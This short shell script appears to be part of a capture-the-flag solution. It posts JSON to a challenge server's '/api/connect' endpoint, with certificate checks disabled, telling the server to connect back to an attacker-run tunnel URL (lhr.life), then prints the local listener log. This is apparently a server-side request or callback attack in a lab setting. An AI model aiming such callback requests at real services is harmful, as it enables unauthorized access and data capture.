cd "$(dirname "$0")"; echo ===RUN >> srv.log
curl -sk -m120 https://asteroid-relay-17fbf8ff1c8b.inst.zerodayctf.pl/api/connect -H 'Content-Type: application/json' -d '{"endpoint":"https://2a4c49e44379fd.app.lhr.life"}'; echo; cat srv.log
